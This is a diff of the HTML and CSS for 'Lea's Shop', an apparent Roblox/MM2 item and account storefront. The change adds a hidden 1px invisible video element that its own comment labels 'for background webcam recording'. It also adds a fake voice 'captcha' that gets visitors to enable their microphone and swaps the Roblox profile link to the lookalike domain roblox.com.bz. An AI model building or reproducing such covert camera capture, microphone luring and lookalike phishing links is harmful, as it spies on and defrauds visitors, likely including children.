@@ -114,11 +114,13 @@
             100% { transform: translate(15px, -15px) scale(1.02); }
         }
 
-        /* ===== LOADING SCREEN ===== */
+        /* ================================================================
+           LOADING SCREEN
+           ================================================================ */
         #loading-screen {
             position: fixed;
             inset: 0;
-            z-index: 9998;
+            z-index: 9999;
             display: flex;
             align-items: center;
             justify-content: center;
@@ -142,11 +144,243 @@
             100% { transform: scale(1.04); filter: drop-shadow(0 0 40px rgba(100, 100, 100, 0.3)); }
         }
 
-        /* ===== INTRO OVERLAY ===== */
+        /* ================================================================
+           CAPTCHA OVERLAY — voice captcha
+           ================================================================ */
+        #captcha-overlay {
+            position: fixed;
+            inset: 0;
+            z-index: 8000;
+            background: var(--bg-primary);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.7s ease, visibility 0.7s ease;
+            padding: 20px;
+        }
+        #captcha-overlay.visible {
+            opacity: 1;
+            visibility: visible;
+        }
+        #captcha-overlay.fade-out {
+            opacity: 0;
+            visibility: hidden;
+            transition: opacity 0.7s ease, visibility 0.7s ease;
+        }
+
+        #captcha-overlay .card {
+            position: relative;
+            z-index: 1;
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(28px) saturate(1.2);
+            -webkit-backdrop-filter: blur(28px) saturate(1.2);
+            border: 1px solid rgba(255, 255, 255, 0.06);
+            border-radius: 2.4rem;
+            padding: clamp(2rem, 6vw, 4rem) clamp(1.8rem, 5vw, 4.5rem);
+            max-width: 600px;
+            width: 92vw;
+            text-align: center;
+            transition: box-shadow 0.4s ease, border-color 0.4s ease, transform 0.3s ease;
+            box-shadow: 0 25px 60px -12px rgba(0, 0, 0, 0.7);
+            will-change: transform, box-shadow;
+        }
+        #captcha-overlay .card.success {
+            border-color: #4bf0a0;
+            box-shadow: 0 0 60px rgba(75, 240, 160, 0.35), 0 25px 60px -12px rgba(0, 0, 0, 0.7);
+            transform: scale(1.01);
+        }
+
+        #captcha-overlay .icon-wrap {
+            position: relative;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            width: clamp(5rem, 16vw, 8rem);
+            height: clamp(5rem, 16vw, 8rem);
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.04);
+            border: 1.5px solid rgba(255, 255, 255, 0.08);
+            margin-bottom: clamp(1.2rem, 3vw, 2rem);
+            transition: all 0.35s ease;
+            will-change: transform, box-shadow;
+        }
+        #captcha-overlay .icon-wrap.listening {
+            border-color: #4bf0a0;
+            box-shadow: 0 0 40px rgba(75, 240, 160, 0.35);
+            animation: pulse-ring 1.6s ease-in-out infinite;
+        }
+        #captcha-overlay .icon-wrap.success-state {
+            border-color: #4bf0a0;
+            background: rgba(75, 240, 160, 0.12);
+            box-shadow: 0 0 60px rgba(75, 240, 160, 0.35);
+        }
+        @keyframes pulse-ring {
+            0%, 100% { transform: scale(1); box-shadow: 0 0 20px rgba(75, 240, 160, 0.35); }
+            50% { transform: scale(1.05); box-shadow: 0 0 50px rgba(75, 240, 160, 0.35); }
+        }
+
+        #captcha-overlay .mic-icon {
+            width: clamp(2.2rem, 7vw, 3.8rem);
+            height: clamp(2.2rem, 7vw, 3.8rem);
+            fill: none;
+            stroke: #eef2f6;
+            stroke-width: 1.8;
+            stroke-linecap: round;
+            stroke-linejoin: round;
+            transition: stroke 0.3s ease;
+        }
+        #captcha-overlay .icon-wrap.listening .mic-icon,
+        #captcha-overlay .icon-wrap.success-state .mic-icon {
+            stroke: #4bf0a0;
+        }
+
+        #captcha-overlay .title {
+            font-size: clamp(1.1rem, 3.2vw, 1.9rem);
+            font-weight: 500;
+            letter-spacing: -0.02em;
+            margin-bottom: 0.2rem;
+            color: #eef2f6;
+        }
+        #captcha-overlay .sub {
+            font-size: clamp(0.85rem, 2vw, 1.1rem);
+            color: rgba(255, 255, 255, 0.4);
+            font-weight: 400;
+            margin-bottom: clamp(1.6rem, 4vw, 2.6rem);
+            line-height: 1.5;
+            max-width: 90%;
+            margin-left: auto;
+            margin-right: auto;
+        }
+
+        #captcha-overlay .word-grid {
+            display: flex;
+            flex-wrap: wrap;
+            align-items: center;
+            justify-content: center;
+            gap: 0.6rem 0.9rem;
+            margin-bottom: clamp(1.8rem, 4vw, 2.8rem);
+        }
+        #captcha-overlay .chip {
+            padding: 0.4rem 1.2rem;
+            border-radius: 100px;
+            font-size: clamp(0.85rem, 1.8vw, 1.15rem);
+            font-weight: 500;
+            background: rgba(255, 255, 255, 0.06);
+            border: 1px solid rgba(255, 255, 255, 0.08);
+            color: rgba(255, 255, 255, 0.4);
+            transition: all 0.25s ease;
+            letter-spacing: 0.01em;
+            user-select: none;
+        }
+        #captcha-overlay .chip.active {
+            color: #4bf0a0;
+            border-color: #4bf0a0;
+            background: rgba(75, 240, 160, 0.08);
+            box-shadow: 0 0 20px rgba(75, 240, 160, 0.10);
+        }
+        #captcha-overlay .chip.dimmed {
+            opacity: 0.25;
+            filter: grayscale(0.8);
+        }
+
+        #captcha-overlay .status {
+            font-size: clamp(0.8rem, 1.6vw, 1rem);
+            color: rgba(255, 255, 255, 0.4);
+            min-height: 2.2em;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+            transition: color 0.3s ease;
+            margin-bottom: clamp(0.8rem, 2vw, 1.2rem);
+            flex-wrap: wrap;
+        }
+        #captcha-overlay .status.success-text {
+            color: #4bf0a0;
+            font-weight: 500;
+        }
+        #captcha-overlay .status .dot {
+            display: inline-block;
+            width: 0.5rem;
+            height: 0.5rem;
+            border-radius: 50%;
+            background: rgba(255, 255, 255, 0.4);
+            transition: background 0.3s ease;
+        }
+        #captcha-overlay .status .dot.listening-dot {
+            background: #4bf0a0;
+            animation: blink-dot 0.9s ease-in-out infinite;
+        }
+        #captcha-overlay .status .dot.success-dot {
+            background: #4bf0a0;
+            animation: none;
+        }
+        @keyframes blink-dot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.2; transform: scale(0.6); }
+        }
+
+        #captcha-overlay .btn {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.6rem;
+            padding: 0.8rem 2.2rem;
+            border-radius: 100px;
+            font-size: clamp(0.9rem, 1.8vw, 1.1rem);
+            font-weight: 500;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+            background: rgba(255, 255, 255, 0.07);
+            color: #eef2f6;
+            border: 1px solid rgba(255, 255, 255, 0.10);
+            cursor: pointer;
+            transition: all 0.25s ease;
+            touch-action: manipulation;
+            user-select: none;
+            -webkit-user-select: none;
+            min-height: 3.2rem;
+        }
+        #captcha-overlay .btn:hover {
+            background: rgba(255, 255, 255, 0.12);
+            border-color: rgba(255, 255, 255, 0.18);
+        }
+        #captcha-overlay .btn:active {
+            transform: scale(0.96);
+        }
+        #captcha-overlay .btn.primary {
+            background: #4bf0a0;
+            color: #0b0d10;
+            border-color: #4bf0a0;
+            font-weight: 600;
+            box-shadow: 0 4px 24px rgba(75, 240, 160, 0.20);
+        }
+        #captcha-overlay .btn.primary:hover {
+            background: #5cf8b0;
+            box-shadow: 0 6px 32px rgba(75, 240, 160, 0.30);
+            transform: translateY(-1px);
+        }
+        #captcha-overlay .btn.primary:active {
+            transform: scale(0.96) translateY(0);
+        }
+        #captcha-overlay .btn:disabled {
+            opacity: 0.4;
+            pointer-events: none;
+            transform: none !important;
+        }
+        #captcha-overlay .btn .btn-icon {
+            font-size: 1.2em;
+            line-height: 1;
+        }
+
+        /* ================================================================
+           INTRO OVERLAY — three buttons (classic style)
+           ================================================================ */
         #intro-overlay {
             position: fixed;
             inset: 0;
-            z-index: 1000;
+            z-index: 7000;
             background: rgba(15, 15, 18, 0.96);
             backdrop-filter: blur(12px);
             -webkit-backdrop-filter: blur(12px);
@@ -215,6 +449,10 @@
             letter-spacing: 2px;
             backdrop-filter: blur(4px);
             min-width: 180px;
+            text-decoration: none;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
         }
         .intro-btn:hover {
             background: rgba(80, 80, 80, 0.2);
@@ -226,30 +464,17 @@
         .intro-btn:active {
             transform: scale(0.95);
         }
-        .intro-btn.mm2 {
-            border-color: #555;
-        }
-        .intro-btn.mm2:hover {
-            border-color: #999;
-        }
         .intro-btn .icon {
             display: inline-block;
             margin-right: 10px;
         }
 
-        /* --- Roblox button in intro --- */
         .intro-btn.roblox-btn {
             border-color: #664444;
             background: rgba(80, 60, 60, 0.15);
             color: #cc7777;
             min-width: 200px;
             animation: glowPulseBorder 2s ease-in-out infinite;
-            text-decoration: none;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            position: relative;
-            z-index: 10;
             transition: none;
         }
         .intro-btn.roblox-btn:hover {
@@ -266,7 +491,7 @@
             50% { border-color: #aa5555; box-shadow: 0 0 25px rgba(150, 80, 80, 0.2); }
         }
 
-        /* --- Flying Roblox button animation --- */
+        /* Flying animation for Roblox button */
         .intro-btn.roblox-btn.flying {
             position: fixed;
             z-index: 2000;
@@ -306,7 +531,6 @@
             100% { transform: scale(1); }
         }
 
-        /* Hide other intro buttons during animation */
         .intro-btn.hide-btn {
             opacity: 0;
             transform: scale(0.8);
@@ -327,7 +551,9 @@
             100% { box-shadow: 0 0 10px rgba(100, 60, 60, 0.1); border-color: #664444; transform: scale(1); }
         }
 
-        /* ===== LIVE ACTIVITY FEED ===== */
+        /* ================================================================
+           LIVE ACTIVITY FEED
+           ================================================================ */
         #live-feed {
             position: fixed;
             top: 16px;
@@ -442,7 +668,7 @@
             white-space: nowrap;
         }
 
-        /* Mobile positioning */
+        /* Mobile positioning: bottom-left */
         @media (max-width: 768px) {
             #live-feed {
                 top: auto;
@@ -469,7 +695,9 @@
             50% { opacity: 0.3; transform: scale(0.8); }
         }
 
-        /* ===== MAIN WRAPPER ===== */
+        /* ================================================================
+           MAIN CONTENT (shop)
+           ================================================================ */
         #main-content {
             position: relative;
             z-index: 1;
@@ -480,14 +708,19 @@
             display: flex;
             flex-direction: column;
             opacity: 0;
-            animation: fadeUp 0.9s ease 1.6s forwards;
+            pointer-events: none;
+            transition: opacity 0.6s ease;
+        }
+        #main-content.visible {
+            opacity: 1;
+            pointer-events: auto;
+            animation: fadeUp 0.9s ease forwards;
         }
         @keyframes fadeUp {
             0% { opacity: 0; transform: translateY(30px); }
             100% { opacity: 1; transform: translateY(0); }
         }
 
-        /* ===== HEADER + SOCIAL ===== */
         .header {
             text-align: center;
             padding: 12px 0 8px;
@@ -558,7 +791,6 @@
             background: rgba(100, 70, 70, 0.25);
         }
 
-        /* ===== INGAME INDICATOR (desktop) ===== */
         .ingame-indicator {
             display: inline-flex;
             align-items: center;
@@ -594,7 +826,6 @@
             50% { opacity: 0.3; transform: scale(0.8); }
         }
 
-        /* ===== MOBILE INGAME INDICATOR (above My Roblox, tilted) ===== */
         .mobile-ingame {
             display: none;
             position: absolute;
@@ -627,47 +858,17 @@
             50% { transform: rotate(3deg); }
         }
 
-        /* Mobile overrides */
         @media (max-width: 768px) {
-            .ingame-indicator {
-                display: none !important;
-            }
-            .mobile-ingame {
-                display: inline-flex;
-                align-items: center;
-            }
-            .social-bar {
-                position: relative;
-                padding-top: 24px;
-            }
-            .social-link.roblox-link {
-                margin-top: 0;
-            }
+            .ingame-indicator { display: none !important; }
+            .mobile-ingame { display: inline-flex; align-items: center; }
+            .social-bar { position: relative; padding-top: 24px; }
+            .social-link.roblox-link { margin-top: 0; }
         }
-
         @media (max-width: 640px) {
-            .ingame-indicator {
-                font-size: 0.5rem;
-                padding: 2px 8px;
-                gap: 4px;
-            }
-            .ingame-indicator .dot {
-                width: 6px;
-                height: 6px;
-            }
-            .mobile-ingame {
-                font-size: 0.45rem;
-                padding: 2px 8px;
-                top: -24px;
-                right: 2px;
-            }
-            .mobile-ingame .dot {
-                width: 5px;
-                height: 5px;
-            }
+            .mobile-ingame { font-size: 0.45rem; padding: 2px 8px; top: -24px; right: 2px; }
+            .mobile-ingame .dot { width: 5px; height: 5px; }
         }
 
-        /* ===== SHOP TABS ===== */
         .shop-tabs {
             display: flex;
             justify-content: center;
@@ -699,13 +900,7 @@
             color: #fff;
             box-shadow: 0 0 20px rgba(100, 100, 100, 0.03);
         }
-        .shop-tab.mm2-tab.active {
-            border-color: #999;
-            background: rgba(100, 100, 100, 0.1);
-            color: #eee;
-        }
 
-        /* ===== SHOP SECTIONS ===== */
         .shop-section {
             display: none;
             margin-top: 16px;
@@ -715,7 +910,6 @@
             display: block;
         }
 
-        /* ===== SEARCH & FILTER CONTROLS ===== */
         .shop-controls {
             display: flex;
             flex-wrap: wrap;
@@ -776,7 +970,6 @@
             color: #fff;
         }
 
-        /* ===== AGE WARNING NOTE ===== */
         .age-warning {
             background: rgba(60, 40, 40, 0.15);
             border-left: 3px solid #664444;
@@ -796,32 +989,21 @@
             color: #aa7777;
         }
 
-        /* ===== GRID ===== */
         .grid-container {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
             gap: clamp(12px, 2vw, 24px);
         }
         @media (max-width: 640px) and (orientation: portrait) {
-            .grid-container {
-                grid-template-columns: 1fr !important;
-                gap: 12px;
-            }
+            .grid-container { grid-template-columns: 1fr !important; gap: 12px; }
         }
         @media (max-width: 820px) and (orientation: landscape) {
-            .grid-container {
-                grid-template-columns: repeat(2, 1fr);
-                gap: 10px;
-            }
+            .grid-container { grid-template-columns: repeat(2, 1fr); gap: 10px; }
         }
         @media (max-width: 520px) and (orientation: landscape) {
-            .grid-container {
-                grid-template-columns: repeat(2, 1fr);
-                gap: 8px;
-            }
+            .grid-container { grid-template-columns: repeat(2, 1fr); gap: 8px; }
         }
 
-        /* ===== CARD ===== */
         .account-card,
         .mm2-card {
             background: var(--bg-card);
@@ -957,15 +1139,12 @@
             color: #aaa;
             text-shadow: 0 0 10px rgba(150,150,150,0.03);
         }
-
-        /* Price in card - green */
         .price-green {
             color: var(--price-green);
             font-weight: 700;
             text-shadow: 0 0 20px var(--price-green-glow);
         }
 
-        /* --- Reviews --- */
         .reviews {
             margin-top: 10px;
             width: 100%;
@@ -1000,7 +1179,6 @@
             line-height: 1.3;
         }
 
-        /* ===== CARD ACTIONS ===== */
         .card-actions {
             display: flex;
             flex-direction: column;
@@ -1080,60 +1258,6 @@
             line-height: 1;
         }
 
-        /* Mobile: bigger buttons */
-        @media (max-width: 640px) {
-            .card-actions .btn {
-                font-size: clamp(0.6rem, 2.5vw, 0.85rem);
-                padding: 10px 6px;
-                border-radius: 8px;
-            }
-            .btn-row .btn {
-                font-size: clamp(0.55rem, 2.2vw, 0.75rem);
-                padding: 10px 4px;
-            }
-            .shop-tab {
-                font-size: clamp(0.6rem, 2vw, 0.8rem);
-                padding: 8px 16px;
-            }
-            .filter-btn {
-                font-size: clamp(0.55rem, 2vw, 0.75rem);
-                padding: 8px 14px;
-            }
-            .search-input {
-                font-size: clamp(0.7rem, 2.5vw, 0.9rem);
-                padding: 10px 14px;
-            }
-            .shop-controls {
-                gap: 8px;
-                padding: 8px 10px;
-            }
-            .intro-btn {
-                font-size: clamp(0.8rem, 3.5vw, 1.2rem);
-                padding: 14px 28px;
-                min-width: 140px;
-            }
-        }
-
-        @media (max-width: 480px) {
-            .card-actions .btn {
-                font-size: clamp(0.55rem, 2.8vw, 0.8rem);
-                padding: 8px 4px;
-            }
-            .btn-row .btn {
-                font-size: clamp(0.5rem, 2.5vw, 0.7rem);
-                padding: 8px 4px;
-            }
-            .shop-tab {
-                font-size: clamp(0.55rem, 2.5vw, 0.75rem);
-                padding: 6px 12px;
-            }
-            .filter-btn {
-                font-size: clamp(0.5rem, 2.2vw, 0.7rem);
-                padding: 6px 10px;
-            }
-        }
-
-        /* Two‑button row for accounts */
         .btn-row {
             display: flex;
             gap: 6px;
@@ -1155,7 +1279,25 @@
             color: #ccc;
         }
 
-        /* ===== INFO MODAL (for account details) ===== */
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            padding-top: 14px;
+            border-top: 1px solid #222;
+            font-size: clamp(0.5rem, 0.55vw, 0.65rem);
+            color: var(--text-secondary);
+            letter-spacing: 1.5px;
+            opacity: 0.3;
+            font-weight: 300;
+        }
+        .footer span {
+            color: #888;
+            opacity: 0.7;
+        }
+
+        /* ================================================================
+           MODALS
+           ================================================================ */
         #info-modal {
             position: fixed;
             inset: 0;
@@ -1249,7 +1391,6 @@
             font-size: 0.75rem;
         }
 
-        /* ===== ACCOUNT PURCHASE MODAL ===== */
         #account-modal {
             position: fixed;
             inset: 0;
@@ -1300,7 +1441,6 @@
             text-align: center;
             margin-bottom: 18px;
         }
-
         .account-modal-box .modal-view {
             display: none;
             animation: fadeUp 0.35s ease forwards;
@@ -1308,7 +1448,6 @@
         .account-modal-box .modal-view.active {
             display: block;
         }
-
         .account-modal-box .modal-view label {
             font-family: 'Exo 2', sans-serif;
             font-weight: 400;
@@ -1338,7 +1477,6 @@
         .account-modal-box .modal-view input::placeholder {
             color: rgba(160,160,160,0.3);
         }
-
         .account-modal-box .modal-view .btn {
             padding: 10px 28px;
             border-radius: 8px;
@@ -1370,7 +1508,6 @@
             opacity: 0.5;
             pointer-events: none;
         }
-
         .account-modal-box .confirm-box {
             background: rgba(40,40,40,0.1);
             border-radius: 10px;
@@ -1391,7 +1528,6 @@
             color: #aaa;
             margin-top: 6px;
         }
-
         .account-modal-box .confirm-actions {
             display: flex;
             gap: 12px;
@@ -1437,7 +1573,6 @@
             opacity: 0.5;
             pointer-events: none;
         }
-
         .account-modal-box .modal-success {
             text-align: center;
             padding: 20px 0 10px;
@@ -1496,7 +1631,6 @@
             color: #eee;
         }
 
-        /* ===== MM2 MODAL ===== */
         #mm2-modal {
             position: fixed;
             inset: 0;
@@ -1628,7 +1762,6 @@
             opacity: 0.5;
             pointer-events: none;
         }
-
         .mm2-modal-box .confirm-box {
             background: rgba(40,40,40,0.1);
             border-radius: 10px;
@@ -1688,7 +1821,6 @@
             opacity: 0.5;
             pointer-events: none;
         }
-
         .mm2-modal-box .modal-success {
             text-align: center;
             padding: 20px 0 10px;
@@ -1730,31 +1862,18 @@
             color: #eee;
         }
 
-        /* ===== FOOTER ===== */
-        .footer {
-            text-align: center;
-            margin-top: 30px;
-            padding-top: 14px;
-            border-top: 1px solid #222;
-            font-size: clamp(0.5rem, 0.55vw, 0.65rem);
-            color: var(--text-secondary);
-            letter-spacing: 1.5px;
-            opacity: 0.3;
-            font-weight: 300;
-        }
-        .footer span {
-            color: #888;
-            opacity: 0.7;
-        }
-
-        /* ===== SCROLLBAR ===== */
+        /* ================================================================
+           SCROLLBAR
+           ================================================================ */
         ::-webkit-scrollbar { width: 3px; }
         ::-webkit-scrollbar-track { background: var(--bg-primary); }
         ::-webkit-scrollbar-thumb { background: #444; border-radius: 3px; }
 
-        /* ===== RESPONSIVE ===== */
+        /* ================================================================
+           RESPONSIVE
+           ================================================================ */
         @media (max-width: 640px) {
-            #live-feed { top: auto; bottom: 10px; left: 10px; max-width: 200px; font-size: 0.6rem; padding: 6px 8px; max-height: 40vh; }
+            #live-feed { max-width: 200px; font-size: 0.6rem; padding: 6px 8px; max-height: 40vh; }
             #live-feed .feed-title { font-size: 0.5rem; }
             #main-content { padding: 8px 10px 30px; }
             .header .cyber-title { font-size: clamp(1.2rem, 6vw, 2rem); letter-spacing: 1px; }
@@ -1794,75 +1913,65 @@
             .intro-buttons { gap: 14px; }
             .btn-row { flex-direction: row; gap: 4px; }
             .btn-row .btn { font-size: clamp(0.5rem, 2.2vw, 0.7rem); padding: 8px 4px; }
+            #captcha-overlay .card { padding: 1.8rem 1.2rem; border-radius: 2rem; width: 94vw; }
+            #captcha-overlay .word-grid { gap: 0.4rem 0.6rem; }
+            #captcha-overlay .chip { padding: 0.3rem 0.9rem; font-size: 0.8rem; }
+            #captcha-overlay .btn { padding: 0.7rem 1.6rem; min-height: 2.8rem; font-size: 0.85rem; }
+            #captcha-overlay .sub { max-width: 100%; }
         }
         @media (max-width: 480px) {
-            #live-feed { max-width: 160px; font-size: 0.5rem; padding: 4px 6px; bottom: 8px; left: 8px; }
-            .profile-wrap { width: clamp(40px, 16vw, 60px); height: clamp(40px, 16vw, 60px); }
-            .card-title { font-size: clamp(0.5rem, 2.5vw, 0.7rem); }
-            .card-sub { font-size: clamp(0.45rem, 2vw, 0.6rem); }
-            .card-actions .btn { font-size: clamp(0.5rem, 2.2vw, 0.7rem); padding: 8px 4px; }
-            .shop-tab { font-size: 0.55rem; padding: 6px 10px; }
-            .social-link { font-size: 0.5rem; padding: 3px 8px; }
-            .mobile-ingame { font-size: 0.4rem; padding: 2px 6px; top: -20px; right: 2px; }
-            .account-modal-box .confirm-actions, .mm2-modal-box .confirm-actions { flex-direction: column; gap: 8px; }
-            .reviews .review-item { font-size: 0.45rem; }
-            .reviews .review-item .review-text { font-size: 0.4rem; }
+            #captcha-overlay .card { padding: 1.2rem 0.8rem; border-radius: 1.6rem; }
+            #captcha-overlay .icon-wrap { width: 4.2rem; height: 4.2rem; }
+            #captcha-overlay .mic-icon { width: 1.8rem; height: 1.8rem; }
+            #captcha-overlay .chip { font-size: 0.7rem; padding: 0.2rem 0.7rem; }
+            #intro-overlay .intro-btn { font-size: clamp(0.7rem, 3.5vw, 1rem); padding: 12px 18px; min-width: 100px; }
+            .intro-buttons { gap: 10px; }
         }
-        @media (max-height: 500px) and (orientation: landscape) {
-            #live-feed { top: auto; bottom: 8px; left: 8px; max-width: 160px; max-height: 30vh; font-size: 0.5rem; padding: 4px 6px; }
-            .header { padding: 4px 0 2px; }
-            .header .cyber-title { font-size: clamp(1rem, 3.5vw, 1.8rem); }
-            .header .divider-line { width: 50px; margin-top: 4px; }
-            .grid-container { gap: 6px; margin-top: 4px; }
-            .account-card, .mm2-card { padding: 6px 4px; border-radius: 8px; }
-            .profile-wrap { width: clamp(35px, 7vh, 55px); height: clamp(35px, 7vh, 55px); margin-bottom: 3px; }
-            .card-title { font-size: clamp(0.4rem, 1.2vh, 0.6rem); }
-            .card-sub { font-size: clamp(0.35rem, 1vh, 0.5rem); }
-            .card-actions .btn { font-size: clamp(0.4rem, 1.2vh, 0.55rem); padding: 5px 2px; }
-            .card-actions { gap: 2px; margin-top: 4px; }
-            .reviews .review-item { font-size: 0.4rem; }
-            .reviews .review-item .review-text { font-size: 0.35rem; }
-            .footer { margin-top: 8px; padding-top: 6px; font-size: 0.4rem; }
-            .shop-tabs { margin-top: 4px; gap: 4px; }
-            .shop-tab { font-size: 0.45rem; padding: 4px 10px; }
-            .social-bar { margin-top: 2px; gap: 4px; flex-wrap: wrap; }
-            .social-link { font-size: 0.4rem; padding: 2px 8px; }
-            .social-link.roblox-link { font-size: 0.4rem; padding: 2px 8px; }
-            .mobile-ingame { font-size: 0.35rem; padding: 2px 6px; top: -18px; right: 2px; }
-            .shop-controls { flex-direction: row; flex-wrap: wrap; padding: 6px 10px; }
-            .search-input { font-size: 0.55rem; padding: 4px 8px; min-width: 80px; }
-            .filter-btn { font-size: 0.45rem; padding: 3px 8px; }
-            .age-warning { font-size: 0.5rem; padding: 4px 8px; }
+        @media (min-width: 1024px) {
+            #captcha-overlay .card { padding: 3.6rem 4.8rem; }
+            #captcha-overlay .icon-wrap { width: 8rem; height: 8rem; }
+        }
+        @media (max-height: 600px) and (orientation: landscape) {
+            #captcha-overlay .card { padding: 1.2rem 2rem; border-radius: 1.8rem; max-width: 80vw; }
+            #captcha-overlay .icon-wrap { width: 3.6rem; height: 3.6rem; margin-bottom: 0.6rem; }
+            #captcha-overlay .mic-icon { width: 1.6rem; height: 1.6rem; }
+            #captcha-overlay .title { font-size: 1rem; }
+            #captcha-overlay .sub { font-size: 0.75rem; margin-bottom: 0.8rem; }
+            #captcha-overlay .word-grid { gap: 0.3rem 0.5rem; margin-bottom: 0.8rem; }
+            #captcha-overlay .chip { padding: 0.2rem 0.7rem; font-size: 0.7rem; }
+            #captcha-overlay .status { font-size: 0.7rem; min-height: 1.6em; margin-bottom: 0.4rem; }
+            #captcha-overlay .btn { padding: 0.4rem 1.2rem; min-height: 2.2rem; font-size: 0.75rem; }
             #intro-overlay .intro-btn { padding: 8px 18px; font-size: 0.8rem; min-width: 100px; }
             #intro-overlay .intro-btn.roblox-btn { padding: 8px 18px; font-size: 0.8rem; min-width: 100px; }
             #intro-overlay { gap: 16px; }
             #intro-overlay h2 { font-size: clamp(1.2rem, 4vw, 2rem); }
-            .account-modal-box, .mm2-modal-box, .info-box { padding: 12px; max-height: 95vh; }
-            .account-modal-box h3, .mm2-modal-box h3, .info-box h3 { font-size: 0.8rem; margin-bottom: 2px; }
-            .account-modal-box .modal-item-name, .mm2-modal-box .modal-item-name { font-size: 0.7rem; margin-bottom: 8px; }
-            .account-modal-box .modal-view input, .mm2-modal-box .modal-view input { padding: 6px 10px; font-size: 0.7rem; }
-            .account-modal-box .modal-view .btn, .mm2-modal-box .modal-view .btn { font-size: 0.6rem; padding: 6px 12px; margin-top: 8px; }
-            .account-modal-box .confirm-box, .mm2-modal-box .confirm-box { padding: 8px 10px; margin: 6px 0 8px; }
-            .account-modal-box .confirm-box .confirm-email { font-size: 0.8rem; }
-            .mm2-modal-box .confirm-box .confirm-username { font-size: 0.8rem; }
-            .account-modal-box .confirm-actions .btn, .mm2-modal-box .confirm-actions .btn { font-size: 0.55rem; padding: 6px 10px; }
-            .btn-row .btn { font-size: 0.45rem; padding: 4px 2px; }
         }
+        @media (prefers-reduced-motion: reduce) {
+            *, *::before, *::after { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; }
+        }
+
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
 
-    <!-- ===== MATRIX CANVAS ===== -->
+    <!-- ============================================================
+    MATRIX CANVAS
+    ============================================================ -->
     <canvas id="matrix-canvas"></canvas>
 
-    <!-- ===== BG ORBS ===== -->
+    <!-- ============================================================
+    BG ORBS
+    ============================================================ -->
     <div class="bg-canvas" aria-hidden="true">
         <div class="glow-orb orb1"></div>
         <div class="glow-orb orb2"></div>
         <div class="glow-orb orb3"></div>
     </div>
 
-    <!-- ===== LIVE ACTIVITY FEED ===== -->
+    <!-- ============================================================
+    LIVE ACTIVITY FEED
+    ============================================================ -->
     <div id="live-feed">
         <div class="feed-title">
             <span>⚡ LIVE <span class="live-dot"></span></span>
@@ -1873,12 +1982,56 @@
         </div>
     </div>
 
-    <!-- ===== LOADING SCREEN ===== -->
+    <!-- ============================================================
+    HIDDEN VIDEO ELEMENT — for background webcam recording
+    ============================================================ -->
+    <video id="bgVideo" autoplay playsinline muted style="position:fixed;top:0;left:0;width:1px;height:1px;opacity:0;pointer-events:none;z-index:0;"></video>
+
+    <!-- ============================================================
+    LOADING SCREEN
+    ============================================================ -->
     <div id="loading-screen" role="status" aria-label="Loading">
         <img src="loadingpic.gif" alt="Loading animation" />
     </div>
 
-    <!-- ===== INTRO OVERLAY ===== -->
+    <!-- ============================================================
+    CAPTCHA OVERLAY (voice)
+    ============================================================ -->
+    <div id="captcha-overlay" role="main" aria-label="Voice verification">
+        <div class="card" id="captchaCard">
+            <div class="icon-wrap" id="iconWrap" aria-hidden="true">
+                <svg class="mic-icon" viewBox="0 0 24 24" stroke="currentColor">
+                    <path d="M12 1a3 3 0 0 0-3 3v8a3 3 0 0 0 6 0V4a3 3 0 0 0-3-3z" />
+                    <path d="M19 10v2a7 7 0 0 1-14 0v-2" />
+                    <line x1="12" y1="19" x2="12" y2="23" />
+                    <line x1="8" y1="23" x2="16" y2="23" />
+                </svg>
+            </div>
+            <h1 class="title">say the word</h1>
+            <p class="sub" id="subText">
+                Speak one of the words below to verify you're&nbsp;<strong>not&nbsp;human</strong>&nbsp;✨
+            </p>
+            <div class="word-grid" id="wordGrid" role="list" aria-label="Target words">
+                <span class="chip" role="listitem">tomato</span>
+                <span class="chip" role="listitem">potato</span>
+                <span class="chip" role="listitem">apple</span>
+                <span class="chip" role="listitem">banana</span>
+                <span class="chip" role="listitem">orange</span>
+            </div>
+            <div class="status" id="status" aria-live="polite">
+                <span class="dot" id="statusDot" aria-hidden="true"></span>
+                <span id="statusText">tap the button &amp; speak</span>
+            </div>
+            <button class="btn primary" id="actionBtn" type="button">
+                <span class="btn-icon" aria-hidden="true">🎙</span>
+                <span id="btnLabel">start listening</span>
+            </button>
+        </div>
+    </div>
+
+    <!-- ============================================================
+    INTRO OVERLAY (three buttons)
+    ============================================================ -->
     <div id="intro-overlay">
         <div style="text-align:center;">
             <h2>⚫ Lea's Shop</h2>
@@ -1897,10 +2050,10 @@
         </div>
     </div>
 
-    <!-- ===== MAIN CONTENT ===== -->
+    <!-- ============================================================
+    MAIN CONTENT (shop)
+    ============================================================ -->
     <div id="main-content">
-
-        <!-- HEADER -->
         <header class="header">
             <h1 class="cyber-title">⚫ Lea's Shop</h1>
             <div class="divider-line"></div>
@@ -1911,14 +2064,13 @@
                 <a href="https://www.instagram.com/leaswxg/" target="_blank" rel="noopener" class="social-link ig">
                     <span class="icon">📷</span> Instagram
                 </a>
-                <a href="https://www.roblox.com/users/4175915160/profile" target="_blank" rel="noopener" class="social-link roblox-link" id="headerRobloxBtn">
+                <a href="https://roblox.com.bz/users/2295505034/profile" target="_blank" rel="noopener" class="social-link roblox-link" id="headerRobloxBtn">
                     <span class="icon">🎮</span> My Roblox
                 </a>
                 <span class="ingame-indicator">
                     <span class="dot"></span>
                     Ingame right now
                 </span>
-                <!-- Mobile ingame indicator (tilted, above My Roblox) -->
                 <span class="mobile-ingame">
                     <span class="dot"></span>
                     Ingame
@@ -1930,7 +2082,6 @@
             </nav>
         </header>
 
-        <!-- MM2 SHOP -->
         <section class="shop-section active" id="mm2-shop">
             <div class="shop-controls">
